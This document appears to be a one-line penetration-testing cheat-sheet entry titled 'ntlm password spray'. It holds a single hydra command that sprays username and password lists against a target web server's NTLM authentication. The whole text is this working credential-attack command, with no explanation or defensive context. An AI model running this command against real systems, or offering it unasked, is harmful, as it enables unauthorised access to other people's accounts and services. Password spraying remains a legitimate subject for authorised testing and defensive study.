## ntlm password spray
hydra -L usernames.txt -P passwords.txt <target_url> http-get '/:A=NTLM:F=401'

